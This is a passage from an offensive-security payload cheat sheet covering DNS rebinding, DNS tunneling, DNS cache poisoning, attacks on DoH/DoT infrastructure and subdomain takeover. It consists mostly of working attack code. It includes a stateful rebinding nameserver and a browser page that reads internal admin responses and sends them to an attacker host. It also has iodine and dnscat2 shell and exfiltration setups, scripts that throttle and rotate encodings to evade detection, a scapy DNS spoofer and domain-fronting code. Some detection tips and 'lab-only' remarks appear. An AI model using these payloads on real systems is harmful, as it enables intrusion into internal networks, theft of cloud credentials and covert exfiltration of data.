# rbndr.us public rebinding service - alternates between two hex-encoded IPs
# Format: <hex-ip1>.<hex-ip2>.rbndr.us
# 127.0.0.1 = 7f000001
# 169.254.169.254 = a9fea9fe (AWS IMDSv1 endpoint)
# 192.168.1.1   = c0a80101 (typical router)

curl -v "http://7f000001.a9fea9fe.rbndr.us/"
curl -v "http://c0a80101.7f000001.rbndr.us:8080/"

# Lock to one IP for N queries, then flip (useful for slow page loads)
# rbndr.us accepts :N suffix to bias the first IP
curl -v "http://7f000001.a9fea9fe.rbndr.us:5/"
```

### Self-Hosted Rebinding Nameserver (Stateful)

```python
#!/usr/bin/env python3
"""Stateful DNS rebinding server with configurable query-count trigger.

Behavior:
  - First N queries return the 'external' IP (attacker server) so the
    victim browser can load the HTML/JS payload.
  - On query N+1 and later, return the 'internal' IP (127.0.0.1, IMDS,
    router, etc.) so the same-origin fetch now hits the internal host.

Serves multiple rebinding domains with independent counters.
"""
from dnslib import DNSRecord, QTYPE, RR, A
from dnslib.server import DNSServer, BaseResolver
from collections import defaultdict

REBIND_DOMAINS = {
    # domain: (external_ip, internal_ip, trigger_count)
    "rebind1.attacker.com": ("203.0.113.10", "127.0.0.1", 3),
    "rebind2.attacker.com": ("203.0.113.10", "169.254.169.254", 5),
    "rebind3.attacker.com": ("203.0.113.10", "192.168.1.1", 4),
}

class StatefulRebindResolver(BaseResolver):
    def __init__(self):
        self.counters = defaultdict(int)

    def resolve(self, request, handler):
        qname = str(request.q.qname).rstrip(".")
        external_ip, internal_ip, trigger = REBIND_DOMAINS.get(
            qname, ("203.0.113.10", "127.0.0.1", 1)
        )
        self.counters[qname] += 1
        # First `trigger` queries -> external IP, then internal IP forever
        ip = external_ip if self.counters[qname] <= trigger else internal_ip
        reply = request.reply()
        # TTL=0 so browser immediately re-resolves on next fetch
        reply.add_answer(RR(qname, QTYPE.A, rdata=A(ip), ttl=0))
        return reply

if __name__ == "__main__":
    resolver = StatefulRebindResolver()
    server = DNSServer(resolver, port=53, address="0.0.0.0", tcp=False)
    print("[*] Stateful rebinding server listening on 0.0.0.0:53/udp")
    server.start()
```

### Multi-A Record Trick (Browser Race)

```bash
# Some browsers/cache resolvers will pick the first A record from a list.
# Serving multiple A records simultaneously (attacker + target) lets the
# attacker win on the first request (page load) and the target on the
# next (XHR/fetch). This avoids TTL churn entirely.

cat > named_multi_a.conf << 'EOF'
zone "multi.attacker.com" {
    type master;
    file "/etc/bind/db.multi.attacker.com";
};
EOF

cat > /etc/bind/db.multi.attacker.com << 'EOF'
$TTL 0
@   IN  SOA ns1.attacker.com. admin.attacker.com. (
            2026010101 ; serial
            0          ; refresh
            0          ; retry
            0          ; expire
            0          ; minimum
            )
@       IN  NS  ns1.attacker.com.
; Both attacker and internal IPs served together - browser chooses one
svc     IN  A   203.0.113.10   ; attacker (page load)
svc     IN  A   127.0.0.1      ; internal (post-rebind XHR)
EOF

rndc reload
```

### RB-CLICK-Style Two-Domain Chain

```html
<!-- RB-CLICK chain: two domains, each rebinding once.
     Domain A loads the malicious page (resolves to attacker IP).
     Same-origin XHR uses Domain B which rebinds to internal IP.
     Defeats Pinning-based defenses that key on host->IP. -->
<!DOCTYPE html>
<html>
<head><title>rebind chain</title></head>
<body>
<script>
(async () => {
  // Step 1: page was loaded from rebind1.attacker.com (attacker IP)
  // Step 2: switch the document.domain / use an iframe pointing at the
  //         second rebinding domain so the XHR hits the internal target.
  const target = "http://rebind2.attacker.com:80/";

  // Poll until rebind2 flips from attacker IP to internal IP
  for (let i = 0; i < 60; i++) {
    try {
      const r = await fetch(target + "admin", { credentials: "include" });
      if (r.status !== 0) {
        const body = await r.text();
        // Exfiltrate the internal response back to attacker
        navigator.sendBeacon(
          "https://collect.attacker.com/hit",
          JSON.stringify({ code: r.status, body: body.slice(0, 4000) })
        );
        break;
      }
    } catch (e) { /* SOP error expected while still bound to attacker IP */ }
    await new Promise(r => setTimeout(r, 1500));
  }
})();
</script>
</body>
</html>
```

### Public Suffix List (PSL) Bypass

```bash
# Browsers exempt "public suffix" domains (co.uk, amazonaws.com, etc.)
# from certain cookie/rebinding relaxations. Attackers can register a
# subdomain on a PSL-listed suffix (e.g. HEROKUAPP.COM used to be on the
# PSL) to inherit some of the relaxations, or use a custom suffix they
# control on their own TLD.

# Check if a candidate domain is on the PSL
python3 -c "
from publicsuffixlist import PublicSuffixList
psl = PublicSuffixList()
for d in ['app.herokuapp.com','static.cloudfront.net','x.github.io','a.attacker.com']:
    print(d, '->', psl.privatesuffix(d))
"

# Register a "fake TLD" by running an internal CA/DNS with a suffix you
# control and pinning it via /etc/hosts on the victim lab machine.
# (Lab-only - on real victims you cannot edit /etc/hosts without code exec.)
echo "203.0.113.10  rebind.attacker.local" | sudo tee -a /etc/hosts
```

### /etc/hosts Override for Lab Reproduction

```bash
# Lab: pin the rebinding domain so the victim VM resolves it deterministically
# Useful for SSRF testing against local services in CI pipelines.

# Pre-seed rebind so the first request goes to attacker, then rely on
# TTL=0 + dnsmasq re-resolution to flip.
cat > /etc/hosts.rebind << 'EOF'
203.0.113.10  rebind.lab.local
EOF

# dnsmasq with --hostsfile to override only the first lookup, then forward
dnsmasq --no-resolv --server=8.8.8.8 \
        --addn-hosts=/etc/hosts.rebind \
        --local-ttl=0 \
        --listen-address=127.0.0.1 \
        --port=0 --dns-forward-max=1000
```

### Bypassing Common Anti-Rebinding Defenses

```bash
# 1. systemd-resolved blocks responses that resolve a public hostname
#    to private/loopback ranges when received over DNS-over-TLS. Force UDP:
dig +notcp @127.0.0.53 rebind.attacker.com

# 2. Chrome Private Network Access (PNA) requires a preflight header from
#    the public origin. The preflight must return:
#    Access-Control-Allow-Private-Network: true
cat > pna_preflight.conf << 'EOF'
# Apache: header on the public attacker origin
Header always set Access-Control-Allow-Private-Network "true"
Header always set Access-Control-Allow-Origin "*"
EOF

# 3. AWS IMDSv2 requires a token (PUT /latest/api/token). Rebinding alone
#    cannot fetch the token because the PUT will be preflighted; instead
#    use a SSRF that supports method=PUT, or chain with a service that
#    echoes the token (e.g. GCP metadata similar endpoint with MD-flavored
#    headers).
curl -X PUT "http://169.254.169.254/latest/api/token" \
     -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
```

### Historical Incident Reproduction (Lab-Only)

```bash
# Roku / Cast-style rebinding (2018): IoT device browser fetched a
# "device control" endpoint on 127.0.0.1 after rebinding. Reproduce:
# - External page at http://rebind.attacker.com:8080/
# - Internal target: http://127.0.0.1:8060/keypress/Home (Roku ECP)
curl "http://rebind.attacker.com:8060/keypress/Home"

# Tesla Model S browser rebinding (Peciva 2014): the in-car browser
# allowed DNS rebinding to reach 127.0.0.1 REST endpoints controlling
# door locks, sunroof, etc. Reproduce against the lab framework:
# - Endpoint pattern: http://127.0.0.1:<port>/command/<action>
curl "http://rebind.attacker.com:8080/command/door_unlock"
# (Lab fixture only; real-vehicle exploitation is out of scope.)
```

---

## 21. DNS Tunneling Payloads (Modern)

Modern DNS tunneling extends classic iodine/dnscat2 setups with DNS-over-HTTPS (DoH), DNS-over-TLS (DoT), and DNS-over-QUIC (DoQ) transports. These hide traffic from classic Suricata rules keyed on plaintext UDP/53 and bypass egress filters that block port 53 entirely. Detection pivots to TLS SNI analysis, DoH endpoint allow-listing, and statistical entropy of query names.

### iodine Power-User Configuration

```bash
# Server: max-throughput iodine setup for big-data exfil
# -P password, -m 1000 max downstream fragment, -b 1024 max upstream
sudo iodined -f -c -P 'REPLACE_WITH_LONG_PASSPHRASE' \
    -m 1000 -b 1024 -t 1 -l 0.0.0.0 \
    10.53.0.1 t1.REPLACE_WITH_YOUR_DOMAIN

# Multiple parallel iodine servers on different subdomains for bandwidth
for i in 1 2 3 4; do
  sudo iodined -f -P "pass${i}" 10.53.${i}.1 t${i}.REPLACE_WITH_YOUR_DOMAIN
done

# Client: connect with custom resolver + request-pin to avoid leak
sudo iodine -f -P 'REPLACE_WITH_LONG_PASSPHRASE' \
    -r 8.8.8.8 \
    -m 1000 t1.REPLACE_WITH_YOUR_DOMAIN

# Verify the tunnel
ip addr show dns0
ping -c 3 10.53.0.1

# SSH-over-iodine (one-shot, no persistent tunnel)
ssh -o ProxyCommand="iodine -P 'REPLACE_WITH_LONG_PASSPHRASE' \
     -r 8.8.8.8 t1.REPLACE_WITH_YOUR_DOMAIN" \
    user@10.53.0.1
```

### dnscat2 Power-User Configuration

```bash
# Server: select query types to dodge Suricata signatures, add delay
ruby dnscat2.rb --secret='REPLACE_WITH_SECRET' \
    --dns="domain=t1.REPLACE_WITH_YOUR_DOMAIN,host=0.0.0.0,port=53" \
    --dns-type=TXT \
    --max-queries=200

# Session command: throttle to 1 query every 5 seconds (low-and-slow)
# dnscat2> delay 5000
# dnscat2> set max-input-size 200

# Client: pipe a shell through dnscat2
./dnscat --host=t1.REPLACE_WITH_YOUR_DOMAIN --secret='REPLACE_WITH_SECRET' \
         --dns-type=TXT --delay=3000

# Tunnel a reverse port: from server, listen on attacker:8080 and forward
# through the client to internal target 10.10.10.5:80
# dnscat2> listen 127.0.0.1:8080 10.10.10.5:80
```

### DoH Tunneling via curl (Direct)

```bash
# Tunnel DNS over HTTPS to a public DoH resolver. Hides queries from
# local Suricata sensors that only watch UDP/53.
curl -sH 'accept: application/dns-json' \
     'https://dns.google/resolve?name=t1.REPLACE_WITH_YOUR_DOMAIN&type=A'

# DoH POST with raw wireformat (binary DNS) - harder to log on URL filters
printf '\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01' \
  | curl -sH 'content-type: application/dns-message' \
         --data-binary @- \
         'https://cloudflare-dns.com/dns-query' \
  | xxd | head

# Doggo: friendly multi-transport DoH client
doggo @https://dns.google t1.REPLACE_WITH_YOUR_DOMAIN A
doggo @tls://1.1.1.1 t1.REPLACE_WITH_YOUR_DOMAIN A
doggo @quic://dns.adguard.com t1.REPLACE_WITH_YOUR_DOMAIN A
```

### DoH Tunnel: Custom DoHtunnel Project

```bash
# Spin up a DoH front: a Python server that accepts DNS wireformat over
# HTTPS and proxies to a downstream resolver that *we* operate. Use this
# when the egress proxy allows HTTPS to known domains but blocks UDP/53.

cat > doh_front.py << 'PYEOF'
#!/usr/bin/env python3
"""Minimal DoH front proxy. Accepts /dns-query (wireformat) and forwards
to a local authoritative server (e.g. iodined) that actually serves the
tunnel zone."""
from http.server import BaseHTTPRequestHandler, HTTPSHTTPServer
import socket, struct, subprocess

class DoHHandler(BaseHTTPRequestHandler):
    def do_post(self):
        if self.path != "/dns-query":
            return self.send_error(404)
        length = int(self.headers.get("Content-Length", 0))
        query = self.rfile.read(length)
        # Forward to local iodined on UDP/5353
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(3.0)
        s.sendto(query, ("127.0.0.1", 5353))
        try:
            data, _ = s.recvfrom(4096)
        except socket.timeout:
            data = b""
        self.send_response(200)
        self.send_header("Content-Type", "application/dns-message")
        self.end_headers()
        self.wfile.write(data)

# Run behind a TLS-terminating reverse proxy (nginx/caddy)
HTTPSHTTPServer(("127.0.0.1", 8053), DoHHandler).serve_forever()
PYEOF

python3 doh_front.py &
# Expose via caddy with valid cert for doh.REPLACE_WITH_YOUR_DOMAIN
```

```caddyfile
# Caddyfile - terminate TLS for DoH front
doh.REPLACE_WITH_YOUR_DOMAIN {
    reverse_proxy 127.0.0.1:8053
    header Access-Control-Allow-Origin "*"
}
```

### DoT Tunneling (TLS over 853)

```bash
# Use kdig for explicit DoT queries
kdig -t AAAA t1.REPLACE_WITH_YOUR_DOMAIN @tls://1.1.1.1

# Stunnel: tunnel raw DNS through TLS to your authoritative DoT server
cat > /etc/stunnel/dot-client.conf << 'EOF'
[dns]
client = yes
accept  = 127.0.0.1:5353
connect = dot.REPLACE_WITH_YOUR_DOMAIN:853
verifyChain = yes
CAfile = /etc/ssl/certs/ca-certificates.crt
EOF

# Point local resolver at the stunnel-fronted DoT
echo "nameserver 127.0.0.1:5353" | sudo tee /etc/resolv.conf.d/dot

# Server side (unbound + DoT listener)
cat > /etc/unbound/unbound.conf.d/dot.conf << 'EOF'
server:
    interface: 0.0.0.0
    port: 853
    tls-service-key:  "/etc/unbound/dot.key"
    tls-service-pem:  "/etc/unbound/dot.crt"
    tls-port: 853
    do-ip6: no
EOF
```

### DNS-over-QUIC (DoQ)

```bash
# DoQ runs DNS over QUIC (UDP/443). Some next-gen DNS providers (AdGuard,
# NextDNS) support it. Useful when 853 is blocked but QUIC/443 is allowed.

doggo @quic://dns.adguard.com t1.REPLACE_WITH_YOUR_DOMAIN A

# AdGuard DoQ endpoint: quic://dns.adguard.com:853
# AdGuard unfiltered:   quic://unencrypted.adguard.org
dig @quic://dns.adguard.com t1.REPLACE_WITH_YOUR_DOMAIN +quic

# Detection tip: QUIC traffic is encrypted but the SNI is in the TLS
# handshake. Look for SNI=dns.adguard.com or SNI=doh.REPLACE_WITH_YOUR_DOMAIN.
tshark -i eth0 -Y "quic && tls.handshake.extensions_server_name" \
       -T fields -e tls.handshake.extensions_server_name | sort | uniq -c
```

### Detection Evasion: Encoding Choices

```bash
# Suricata rule authors look for high-entropy base32/base64 labels.
# iodine defaults to base32; switch to base64url or hex to dodge naive
# "is-base32" signatures, or use TXT-only queries to blend with SPF.

# iodine: force base64 (less DNS-safe chars, more bandwidth)
sudo iodine -P 'pass' -b 1024 -e 'base64' t1.REPLACE_WITH_YOUR_DOMAIN

# Custom exfil: rotate encoding per chunk
python3 - << 'PYEOF'
import base64, binascii, os, socket, struct, time, random
DOMAIN = "exfil.REPLACE_WITH_YOUR_DOMAIN"
encoders = [
    lambda b: base64.b32encode(b).decode().rstrip("=").lower(),
    lambda b: base64.b64encode(b).decode().rstrip("=").replace("+", "-").replace("/", "_"),
    lambda b: binascii.hexlify(b).decode(),
]
data = b"REPLACE_WITH_SENSITIVE_BLOB_IN_LAB_ONLY"
CHUNK = 40
for i in range(0, len(data), CHUNK):
    enc = random.choice(encoders)
    label = enc(data[i:i+CHUNK])
    name = f"{i:04d}.{label}.{DOMAIN}"
    try:
        socket.gethostbyname(name)
    except socket.gaierror:
        pass
    time.sleep(random.uniform(0.2, 1.5))  # jittered QPS
PYEOF
```

### Queries-Per-Second Throttling

```bash
# Most SIEM rules trigger on >X DNS queries/second per host. Throttle to
# stay under typical noise floor (~1 QPS average).

# iodine server: cap upstream rate (clients will back off)
sudo iodined -P 'pass' --max-queries-per-second=5 t1.REPLACE_WITH_YOUR_DOMAIN

# dnscat2: minimum delay between queries (ms)
# dnscat2> delay 2000

# Custom exfil: token-bucket rate limiter
python3 - << 'PYEOF'
import time, socket
RATE = 0.8  # queries per second
last = 0.0
def send(q):
    global last
    now = time.time()
    gap = 1.0 / RATE
    if now - last < gap:
        time.sleep(gap - (now - last))
    try: socket.gethostbyname(q)
    except: pass
    last = time.time()
for i in range(100):
    send(f"chunk-{i:03d}.exfil.REPLACE_WITH_YOUR_DOMAIN")
PYEOF
```

---

## 22. DNS Cache Poisoning (Modern Variants)

Modern cache-poisoning research has moved past Kaminsky-style TXID prediction. The SAD DNS attack (CVE-2020-25705) abuses an ICMP side-channel to determine whether a resolver has an outstanding query for a target name, dramatically shrinking the spoofing window. Other modern vectors include IPID-probing, fragment-prefix attacks, and exploitation of forwarder chains where the upstream resolver does the attacker's bidding for them.

### SAD DNS (CVE-2020-25705) Detection

```bash
# SAD DNS uses an ICMP "rate limit reached" side channel on the resolver
# to learn when a victim resolver has an outstanding query. Detect by
# looking for ICMP "port unreachable" bursts that correlate with DNS
# queries from the resolver.

# Capture ICMP + DNS together
sudo tcpdump -i eth0 -n -w saddns.pcap 'icmp or port 53'

# Analyze: count ICMP unreachable per source IP
tshark -r saddns.pcap -Y 'icmp.type==3' \
       -T fields -e ip.src | sort | uniq -c | sort -rn | head

# Check Linux kernel DNS ratelimit setting (post-patch kernels are 0)
sysctl net.ipv4.icmp_ratemask net.ipv4.icmp_ratelimit
# Mitigation: ensure ratelimit applies to ICMP responses triggered by DNS
sudo sysctl -w net.ipv4.icmp_msgs_per_sec=1000
```

### SAD DNS Attack Sketch (Lab-Only)

```python
#!/usr/bin/env python3
"""SAD DNS lab reproduction skeleton.

Educational only. Demonstrates the ICMP side-channel oracle used to
detect when a resolver has an outstanding query for a victim domain.
DO NOT run against any resolver you do not own.
"""
import socket, struct, time, scapy.all as scapy

VICTIM_RESOLVER = "REPLACE_WITH_YOUR_RESOLVER_IP"   # your lab resolver
TARGET_NAME     = "trigger.REPLACE_WITH_YOUR_DOMAIN"  # your lab domain

def trigger_dns_query(name):
    """Send a recursive query so the resolver opens an outstanding query."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    q = build_dns_query(name)
    s.sendto(q, (VICTIM_RESOLVER, 53))
    return s

def icmp_rate_probe(ip):
    """Send a burst of UDP packets to a closed port and count ICMP unreachables.
    A resolver with an outstanding query will hit its ICMP ratelimit and stop
    sending unreachables -> oracle 'blocked'."""
    closed_port = 12345
    ans = scapy.sr1(
        scapy.IP(dst=ip) / scapy.UDP(dport=closed_port),
        timeout=2, verbose=0
    )
    return 1 if (ans and ans.haslayer(scapy.ICMP)) else 0

# Phase 1: baseline ICMP responses (no outstanding query)
baseline = icmp_rate_probe(VICTIM_RESOLVER)
# Phase 2: trigger a query that the resolver must forward, immediately probe
sock = trigger_dns_query(TARGET_NAME)
oracle = icmp_rate_probe(VICTIM_RESOLVER)
print(f"baseline={baseline} during-query={oracle} "
      "->" , "likely outstanding query" if oracle < baseline else "no outstanding query")
```

### Fragment-Prefix / IPID-Probing

```bash
# Some resolvers forward queries over TCP/53 to upstream, which is subject
# to IP fragmentation. Attacker can race a forged fragment that overwrites
# the answer section. Detect support by checking IPID predictability.

# Probe IPID pattern: each probe should increment by 1 for global counter
for i in $(seq 1 8); do
    hping3 -S -p 80 -c 1 REPLACE_WITH_YOUR_TARGET_IP 2>/dev/null \
        | awk '/id=/{print $2}'
done
# Sequential IDs (1,2,3,...) = vulnerable to fragment prediction.

# Tooling: use 'fragroute' or 'scapy' to inject forged fragments in a lab
sudo fragroute -f frag.conf REPLACE_WITH_YOUR_TARGET_IP

cat > frag.conf << 'EOF'
ip_frag 8
ip_tint 1
order random
EOF
```

### Feamster-Style On-Path Spoofing (Lab)

```python
#!/usr/bin/env python3
"""On-path DNS spoofing lab.

When the attacker is on-path (same LAN or compromised gateway), they can
race the legitimate response. This is the classic 'Feamster-style' attack
where the attacker guesses the (TXID, source port) tuple or wins the race
when the resolver's randomization is weak.

Lab-only: run against a resolver you control (e.g. unbound on localhost).
"""
import socket, struct, random, time
from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send, sniff

IFACE         = "eth0"
VICTIM        = "REPLACE_WITH_VICTIM_IP"
RESOLVER      = "REPLACE_WITH_RESOLVER_IP"  # your lab resolver
TARGET_DOMAIN = "spoof.lab.REPLACE_WITH_YOUR_DOMAIN"
SPOOF_IP      = "203.0.113.99"

def poison(pkt):
    if not pkt.haslayer(DNS) or pkt[DNS].qr != 0:
        return
    qname = pkt[DNSQR].qname.decode(errors="ignore").rstrip(".")
    if TARGET_DOMAIN not in qname:
        return
    # Race the legitimate response with our own
    txid = pkt[DNS].id
    spoof = (IP(src=RESOLVER, dst=VICTIM) /
             UDP(sport=53, dport=pkt[UDP].sport) /
             DNS(id=txid, qr=1, qd=pkt[DNSQR],
                 an=DNSRR(rrname=pkt[DNSQR].qname, type="A",
                           rdata=SPOOF_IP, ttl=300)))
    send(spoof, iface=IFACE, verbose=0)
    print(f"[+] raced TXID={txid:04x} -> {SPOOF_IP}")

print(f"[*] Sniffing DNS queries for *{TARGET_DOMAIN}* on {IFACE}")
sniff(iface=IFACE, filter="udp port 53", prn=poison, store=0)
```

### Forwarder Chain Exploitation

```bash
# Many enterprises chain resolvers: client -> site forwarder -> corporate
# -> ISP. If any link does NOT require DNSSEC validation, the upstream
# link is the weak point.

# Probe forwarder behavior from inside the network
dig @site-forwarder.internal example.com A +dnssec +cd
# +cd = checking disabled. If forwarder forwards 'cd' bit to upstream that
# honors it, attacker-controlled responses bypass validation.

# Identify forwarder hops via TXT fingerprinting (some append chain info)
dig @site-forwarder.internal version.bind chaos txt +short
dig @site-forwarder.internal hostname.bind chaos txt +short

# Test that downstream trust the upstream by spoofing a response at the
# upstream boundary and observing the site forwarder cache it.
dig @site-forwarder.internal test.REPLACE_WITH_YOUR_DOMAIN A +short
```

### DNSSEC-Not-Required Targets

```bash
# Even if the recursive resolver validates DNSSEC, an unsigned zone can
# still be spoofed. Enumerate unsigned subdomains of the victim.

# Find subdomains with no DS record (no DNSSEC delegation)
for sub in www mail vpn api dev staging; do
    name="${sub}.REPLACE_WITH_YOUR_DOMAIN"
    ds=$(dig +short $name DS)
    rrsig=$(dig +short $name A +dnssec | grep RRSIG)
    if [ -z "$ds" ] && [ -z "$rrsig" ]; then
        echo "[UNSIGNED] $name"
    fi
done

# Unsigned + non-DNSSEC-validating resolver = spoofable
```

---

## 23. DoH / DoT / DoQ Attack Payloads

Attackers don't just tunnel *over* DoH/DoT/DoQ - they also attack the DoH infrastructure itself: enumerating records via the JSON API without touching UDP/53, detecting which DoH proxy a victim is using, manipulating TLS SNI to defeat filtering, and abusing ESNI/ECH to hide the real query target.

### Server-Side Enumeration via DoH JSON API

```bash
# Cloudflare DoH JSON endpoint - no DNS client required, ideal for
# restricted environments where only HTTPS egress is allowed.
curl -sH 'accept: application/dns-json' \
     'https://cloudflare-dns.com/dns-query?name=REPLACE_WITH_YOUR_DOMAIN&type=A' \
     | jq '.Answer[]'

# Google DoH JSON - supports Name Minimization bypass (returns full chain)
curl -s 'https://dns.google/resolve?name=REPLACE_WITH_YOUR_DOMAIN&type=MX' \
     | jq '.Authority[]'

# Multi-type enumeration over DoH
for t in A AAAA MX NS TXT SOA CAA SRV CNAME; do
    echo "=== $t ==="
    curl -sH 'accept: application/dns-json' \
         "https://dns.google/resolve?name=REPLACE_WITH_YOUR_DOMAIN&type=${t}" \
         | jq -c '{Status, Answer}'
done
```

```python
#!/usr/bin/env python3
"""Pure-DoH subdomain brute forcer. No UDP/53 traffic - useful in networks
that block outbound 53 entirely. Round-robins across public DoH endpoints
to dodge rate limits."""
import requests, itertools, time

DOMAIN = "REPLACE_WITH_YOUR_DOMAIN"
WORDLIST = "/usr/share/wordlists/dnsrecon/namelist.txt"
DOH_ENDPOINTS = [
    "https://dns.google/resolve",
    "https://cloudflare-dns.com/dns-query",
    "https://dns.quad9.net:5053/dns-query",
    "https://doh.opendns.com/dns-query",
]
ep = itertools.cycle(DOH_ENDPOINTS)

with open(WORDLIST) as f:
    for line in f:
        sub = line.strip()
        if not sub:
            continue
        host = f"{sub}.{DOMAIN}"
        url = next(ep)
        try:
            r = requests.get(url,
                             params={"name": host, "type": "A"},
                             headers={"accept": "application/dns-json"},
                             timeout=4)
            data = r.json()
            if data.get("Answer"):
                addrs = ",".join(a["data"] for a in data["Answer"]
                                 if a.get("type") == 1)
                print(f"[+] {host} -> {addrs}")
        except Exception:
            pass
        time.sleep(0.1)  # be polite to public DoH
```

### Client-Side DoH Proxy Detection

```bash
# Detect whether a victim host is using a third-party DoH proxy (e.g.
# Cloudflare, NextDNS) by observing the TLS SNI of outgoing 443 traffic.

sudo tshark -i eth0 -Y 'tls.handshake.type==1 && tcp.port==443' \
    -T fields -e tls.handshake.extensions_server_name \
    | sort | uniq -c | sort -rn | head

# Known DoH SNIs to alert on:
#   dns.google
#   cloudflare-dns.com
#   dns.quad9.net
#   doh.opendns.com
#   dns.nextdns.io
#   dns.adguard.com
#   mozilla.cloudflare-dns.com   (Firefox default)

# Detect DoH by IP destination (well-known DoH endpoints)
for ip in 8.8.8.8 8.8.4.4 1.1.1.1 1.0.0.1 9.9.9.9 149.112.112.112; do
    echo -n "$ip: "
    curl -s -o /dev/null -w '%{http_code}\n' \
         --max-time 3 \
         "https://${ip}/dns-query?name=example.com&type=A" \
         -H 'accept: application/dns-message'
done
```

### TLS SNI Manipulation

```bash
# Domain fronting-style: present an allowed SNI but actually reach a
# different DoH endpoint via the Host header. Useful when an egress
# proxy allow-lists SNI=dns.google but you want to reach your own server.

# curl with explicit SNI override
curl -svk --resolve doh.REPLACE_WITH_YOUR_DOMAIN:443:1.2.3.4 \
     -H 'Host: dns.google' \
     'https://doh.REPLACE_WITH_YOUR_DOMAIN/dns-query?name=test&type=A'

# Python SNI manipulation via custom SSLContext
python3 - << 'PYEOF'
import ssl, socket, http.client
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
# Present SNI=dns.google but connect to attacker IP
ctx.set_servername_callback(lambda sslsock, name, ctx: None)
conn = http.client.HTTPSConnection("1.2.3.4", 443, context=ctx)
conn.putrequest("GET", "/dns-query?name=test&type=A", skip_host=True)
conn.putheader("Host", "dns.google")
conn.endheaders()
resp = conn.getresponse()
print(resp.status, resp.read()[:200])
PYEOF
```

### ESNI / ECH Bypass Tactics

```bash
# Encrypted Client Hello (ECH, formerly ESNI) encrypts the SNI inside the
# TLS ClientHello using an HPKE-encrypted inner SNI. The outer SNI becomes
# a public front name (e.g. cloudflare-ech.com). Detection pivots to:

# 1. Identify ECH usage: look for extension type 0xFE0D in ClientHello
sudo tshark -i eth0 -Y 'tls.handshake.type==1' \
    -V -o 'tls.keys_list:...' \
    | grep -A2 -i 'ECH|encrypted_client_hello|extension: 65037'

# 2. ECH config is published in DNS as HTTPS/SVCB records with ech=...
dig REPLACE_WITH_YOUR_DOMAIN HTTPS +short | grep -o 'ech=[A-Za-z0-9+/=]*'

# 3. Bypass ECH by attacking the public DNS resolver to strip HTTPS records
#    (cache poison / downgrade), forcing the client to fall back to plain
#    ClientHello with cleartext SNI.

# 4. Block ECH entirely at egress by dropping ClientHello >512 bytes
#    (ECH adds ~400 bytes). iptables rule:
sudo iptables -A OUTPUT -p tcp --dport 443 \
    -m length --length 0:512 -j REJECT
```

### DoH Server-Side Fingerprinting

```bash
# Identify which DoH server software a custom endpoint runs by probing
# uncommon types and observing error responses.

for ep in https://doh.REPLACE_WITH_YOUR_DOMAIN/dns-query \
          https://dns.google/resolve \
          https://cloudflare-dns.com/dns-query; do
    echo "=== $ep ==="
    # Send malformed query - software stack leaks in error message
    curl -s -o /dev/null -w 'status=%{http_code} size=%{size_download}\n' \
         -H 'content-type: application/dns-message' \
         --data-binary 'XXXX' "$ep"
    # Send unsupported type (e.g. ANY)
    curl -sH 'accept: application/dns-json' \
         "${ep}?name=test&type=ANY" | head -c 200
    echo
done

# Common fingerprints:
#   Cloudflare: 400 + 'Unsupported type' for ANY
#   dnsdist:    500 + HTML error page
#   unbound:    SERVFAIL JSON
#   knot-resolver: 501 + json {'error':...}
```

---

## 24. Subdomain Takeover Payloads

Subdomain takeover occurs when a CNAME points to a deprovisioned cloud resource whose DNS record remains dangling. The attacker re-registers the resource on the provider and serves content from the victim's subdomain - inheriting the victim's TLS certificates (via ACME HTTP-01 in some cases) and brand trust.

### CNAME Discovery and Dangling Detection

```bash
# Step 1: collect all CNAMEs from prior enumeration
dig REPLACE_WITH_YOUR_DOMAIN CNAME +noall +answer
for sub in www mail dev staging api admin; do
    echo "=== $sub ==="
    dig ${sub}.REPLACE_WITH_YOUR_DOMAIN CNAME +short
done

# Step 2: find dangling CNAMEs (CNAME set but A returns NXDOMAIN or provider fingerprint)
cat > cnames.txt << 'EOF'
blog.example.com    -> ghost-example.herokuapp.com
old.example.com     -> example-site.s3.amazonaws.com
docs.example.com    -> exampledocs.netlify.app
dev.example.com     -> exampledev.azurewebsites.net
static.example.com  -> example.github.io
EOF

# Step 3: test each CNAME target for availability
while read cname arrow target; do
    [ "$arrow" = "->" ] || continue
    echo -n "$cname -> $target : "
    if ! dig +short $target A | grep -q .; then
        echo "DANGLING (no A record)"
    fi
    curl -s -o /dev/null -w 'http=%{http_code} ' "http://${target}/"
    curl -sk -o /dev/null -w 'https=%{http_code}\n' "https://${target}/"
done < cnames.txt
```

### NXDOMAIN Provider Fingerprints

```python
#!/usr/bin/env python3
"""Provider fingerprint table for detecting dangling CNAMEs.

Each cloud provider returns a specific fingerprint when a resource is
deprovisioned but the DNS still points at the provider. Match against
HTTP response body / status to identify the responsible provider.
"""
PROVIDER_FINGERPRINTS = {
    "azure": {
        "domains": ["azurewebsites.net", "cloudapp.net", "trafficmanager.net",
                    "blob.core.windows.net", "azureedge.net"],
        "status": [404],
        "body": r"No such app|404 Web Site not found|The resource you are looking for",
    },
    "aws_s3": {
        "domains": ["s3.amazonaws.com", "s3-website-*.amazonaws.com"],
        "status": [404],
        "body": r"The specified bucket does not exist|NoSuchBucket",
    },
    "github_pages": {
        "domains": ["github.io"],
        "status": [404],
        "body": r"There isn't a GitHub Pages site here",
    },
    "heroku": {
        "domains": ["herokuapp.com", "herokussl.com"],
        "status": [404],
        "body": r"No such app|herokucdn",
    },
    "shopify": {
        "domains": ["myshopify.com"],
        "status": [404],
        "body": r"Sorry, this shop is currently unavailable",
    },
    "fastly": {
        "domains": ["fastly.net"],
        "status": [500, 404],
        "body": r"Fastly error: unknown domain",
    },
    "google_cloud_storage": {
        "domains": ["c.storage.googleapis.com", "storage.googleapis.com"],
        "status": [404],
        "body": r"The specified bucket does not exist|NoSuchBucket",
    },
    "zendesk": {
        "domains": ["zendesk.com"],
        "status": [404],
        "body": r"Help Center Closed",
    },
    "tumblr": {
        "domains": ["tumblr.com"],
        "status": [404],
        "body": r"Whatever you were looking for doesn't currently exist",
    },
}

import re, requests
def fingerprint(url):
    try:
        r = requests.get(url, timeout=8, allow_redirects=False)
    except Exception as e:
        return None
    for prov, fp in PROVIDER_FINGERPRINTS.items():
        if r.status_code in fp["status"] and re.search(fp["body"], r.text):
